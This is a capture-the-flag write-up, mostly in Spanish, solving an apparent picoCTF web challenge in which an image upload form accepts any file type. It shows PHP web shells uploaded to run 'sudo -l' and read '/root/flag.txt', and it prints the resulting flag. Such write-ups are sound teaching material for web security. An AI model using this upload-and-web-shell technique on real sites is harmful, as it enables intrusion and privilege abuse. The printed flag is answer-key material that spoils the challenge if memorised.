## Descripción
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

Additional details will be available after launching your challenge instance.
## Solución
==Vamos as usar un web shell de php==
1- Si vamos al script de la página vemos que no valida las extensiones de los archivos así que podemos colocarle un webshell que nos permita ver contenido de la página.
```js
var loadFile = function(event) {
	var input = event.target;
	var file = input.files[0];
	var type = file.type;
	var output = document.getElementById('preview_img');


	output.src = URL.createObjectURL(event.target.files[0]);
	output.onload = function() {
		URL.revokeObjectURL(output.src) // free memory
	}
};
```
2- Hacemos un webshell de php que nos permita ver los permisos a los que tenemos acceso con sudo 
```php
<?php echo exec("sudo -l");?>
```
3- En este caso cuando cargamos un archivo a la página nos dice esto:
```
The file webshell.php has been uploaded Path: uploads/webshell.php
```
4- Cargamos el webshell y visitamos la página a la que se van los archivos y vemos que tenemos todos los privilegios
```
(ALL) NOPASSWD: ALL
```
5- Modificamos el webshell para ver los archivos del directorio root
```php
<?php echo exec("sudo ls /root/");?>
```
Y nos devuelve esto:
```
flag.txt
```
6- Ahora modificamos el webshell para ver el contenido del flag.txt
```php
<?php echo exec("sudo cat /root/flag.txt");?>
```
7- Finalmente vemos la bandera
```
picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}
```
## Notas adicionales
El comando `sudo -l` muestra una lista de los privilegios que tienes con el comando `sudo`.
## Referencias